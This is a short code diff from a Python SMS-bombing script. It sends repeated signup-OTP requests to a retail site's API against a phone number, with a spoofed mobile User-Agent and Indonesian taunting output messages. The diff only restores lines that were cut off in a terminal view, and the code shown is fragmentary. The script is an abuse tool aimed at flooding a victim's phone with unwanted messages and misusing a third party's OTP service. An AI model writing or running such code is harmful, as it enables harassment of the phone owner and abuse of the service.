@@ -34,7 +34,7 @@ def main():
 
         ua = {
         'Connection': 'keep-alive',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; M50 STAR Build/NRD90M                >
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; M50 STAR Build/NRD90M                
         'Referer': 'https://www.mapclub.com/en/user/signup',
         }
 
@@ -42,14 +42,14 @@ def main():
         'phone': no,
         }
 
-        sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp',                 >
+        sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp',                 
 
         for x in range(jml):
                 time.sleep(3)
                 if 'error' in sendSms.text:
-                        print('Spam Sms '+ no + ' \33[31;1m[ MAMPUS LO GAGAL                 >
+                        print('Spam Sms '+ no + ' \33[31;1m[ MAMPUS LO GAGAL ]')                
                 else:
-                        print('Spam Sms '+ no + ' \33[31;1m[ Success Subscrib                >
+                        print('Spam Sms '+ no + ' \33[31;1m[ Success Subscrib Dawet Tv ]')              
 
 main()
 lagi()
